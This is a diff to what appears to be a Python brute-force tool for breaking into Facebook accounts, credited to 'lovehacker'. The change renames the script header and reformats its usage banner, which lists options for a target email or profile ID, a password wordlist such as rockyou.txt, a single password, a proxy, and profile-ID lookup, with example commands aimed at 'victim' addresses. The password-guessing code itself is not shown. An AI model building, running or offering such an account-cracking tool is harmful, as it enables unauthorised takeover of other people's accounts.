@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 ######################
-# SCRIPT : Facebook
+# SCRIPT : TargetAttack
 #    JOB : Brute Force Attack On Facebook Accounts
 #Codedby : lovehacker
 ######################
@@ -230,31 +230,42 @@ parse = optparse.OptionParser(yl+"""
 Usage: python ./Attack.py [OPTIONS...]
 -------------
 OPTIONS:
-       |
-    |--------    
-    |-t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
-    |--------
-    |-w <wordlist Path>                      ::> Specify Wordlist File Path
-    |--------
-    |-s <single password>                     ::> Specify Single Password To Check
-    |--------
-    |-p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
-    |--------
-    |-g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
--------------
+|--------------------------------------------|
+|-t <target email> [OR] <FACEBOOK ID>        |
+|Specify target Email [OR] Target Profile ID |
+|--------------------------------------------|
+|-w <wordlist Path>                          |
+|Specify Wordlist File Path                  |
+|--------------------------------------------|
+|-s <single password>                        |
+|Specify Single Password To Check            |
+|--------------------------------------------|
+|-p <Proxy IP:PORT>                          |
+|Specify HTTP/S Proxy (Optional)             |
+|--------------------------------------------|
+|-g <TARGET Facebook Profile URL>            |
+|Target Facebook Profile URL For Get HIS ID  |
+|--------------------------------------------|
+
 Examples:
-        |
-     |--------
-     | python Attack.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
-     |--------
-     | python Attack.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
-     |--------
-     | python Attack.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 default(port=8080,80) 
-     |--------
-     | python Attack.py -t victim@gmail.com -s 1234567
-     |-------- 
-     | python Attack.py -g https://www.facebook.com/lovehacker 
-     |-------- 
+
+|--------------------------------------------|
+| python Attack.py -t victim@gmail.com       |
+|-w /usr/share/wordlists/rockyou.txt         |
+|--------------------------------------------|
+| python Attack.py -t 100001013078780        |
+|-w C:\\Users\\Me\\Desktop\\wordlist.txt     |
+|--------------------------------------------|
+| python Attack.py -t victim@hotmail.com     | 
+|-w D:\\wordlist.txt -p 35.236.37.121        |
+| default(port=8080,80)                      |
+|--------------------------------------------|
+| python Attack.py -t victim@gmail.com       |
+|-s 1234567                                  |
+|--------------------------------------------|
+| python Attack.py                           |
+|-g https://www.facebook.com/lovehacker      |
+|--------------------------------------------|
 """)
 def Main():
    parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
